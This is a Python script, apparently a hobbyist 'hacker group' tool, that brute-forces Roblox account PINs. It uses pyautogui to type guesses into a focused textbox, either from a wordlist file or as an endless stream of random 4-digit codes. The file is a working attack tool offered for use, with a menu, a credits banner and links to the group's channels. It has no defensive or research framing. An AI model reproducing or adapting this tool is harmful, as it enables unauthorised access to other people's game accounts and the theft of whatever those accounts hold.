import pyautogui as gui
import random, time, os
from colorama import Fore

version = "2.0"
os.system("pip install colorama")
os.system("pip3 install colorama")
os.system("pip3 install pyautogui")
os.system("clear")

print(Fore.GREEN+"""

Hewo!, welcome to roblox pin bruteforcer
visit my github: https://github.com/abalesluke
By: Anikin Luke

""")
print(Fore.MAGENTA+"Type 'help' or -h to see commands ")
	
while True:
	
	
	def path():
		print(Fore.MAGENTA+"Type 'start' to start")
		print(Fore.MAGENTA+"and it will automatically start in 5sec")
		print(Fore.MAGENTA+"you must select a textbox so it will work")
		ui = input(Fore.CYAN+"AL104~: ").lower()
		if(ui == 'start'):
		      
			w = "pins.txt"
			w_open = open(w, 'r')
			
			time.sleep(5)
			for x in w_open:
				print(Fore.GREEN+x)
				gui.write(x)
				gui.press('Enter')
				time.sleep(.5)
				gui.press('backspace', presses=6)
		      
		else:
		      print("Type s or start to start.")
		      return()
 	
	def default():
		print(Fore.MAGENTA+"Type 'start' to start")
		print(Fore.MAGENTA+"and it will automatically start in 5sec")
		print(Fore.MAGENTA+"you must select a textbox so it will work")
		ui = input(Fore.CYAN+"AL104~: ").lower()
		if(ui == 'start'):
		      
			char = "1234567890"
			char_list = list(char)
			chars = "four"
			
			time.sleep(5)
			while True:
				r = random.choices(char_list, k=len(chars))
				print(Fore.GREEN, r)
				gui.write(r)
				gui.press('Enter')
				time.sleep(.2)
				gui.press('backspace',presses=6)
				
		else:
		      print("Type s or start to start.")
		      return()  
	
	
	def help():
		print("""  
	==============================================
	+|  ROBLOX PIN BRUTE coded by Anikin Luke   |+
	==============================================
	+|     COMMANDS            Decription       |+
	+|------------------------------------------|+
	+|   [1] =======   bruteforce with wordlist |+
	+|   [2] ==========  brutefoce with random  |+
	+|   [3] ==============  About              |+
	+|   [0] =================== Exit           |+
	+|                                          |+
 	 ===========================================		
 	""")	

	def about():
		print("""
          =============================================
  	  +|             About this tool             |+
  	  =============================================
  	  +|              This Tool Is               |+
          +|               Is Created                |+
    	  +|                   By                    |+
    	  +|            Anikin Luke Abales           |+
     	  +|  for SudoCentercorp team CyberHackers   |+
          +|-----------------------------------------|+
    	  +| Tool name: RobloxPinBrute               |+
   	  +| Use To Bruteforce Roblox Pin            |+
    	  +| Tool version: {version}                 |+
          +|-----------------------------------------|+
    	  +|                Contact                  |+
    	  +|             Facebook-Group              |+
    	  +|  facebook.com/groups/sudocyberhackers   |+
          +|                                         |+
     	  +|          Discord invite link            |+
    	  +|     https://discord.gg/H7NXjU9BQ9       |+
          +|--------------^--------^-----------------|+
    	  +| Github: https://github.com/abalesluke   |+
     	  +|                                         |+
    	  +|                 Note!                   |+
          +|   This tool is Originally created by me |+
          +|   so please dont republish it on github |+
          +|   i do not autorized you to edit this   |+
          +|   tool or republish it on github.       |+
          +|                                         |+
          +|         Editing or changing the         |+
          +|       name of the coder or developer    |+
          +|        wont make you a programmer.      |+
          +|                                         |+
          +|        [+]Respect the coder's[+]        |+
          +|     ©️Copyright All Rights Reserved     |+
           ===========================================  
		""")


	ui = input(Fore.WHITE+"AL104 >~: ").lower()
	
	if(ui == 'help' or ui == '-h'):
		help()
	elif(ui == '1'):
		path()
	elif(ui == '2'):
		default()
	elif(ui == '3'):
		about()
	elif(ui == '0'):
		break
	else:
		os.system("clear")
		print("Error! command not found!")
		print("Try Executing -h ")
		time.sleep(1)
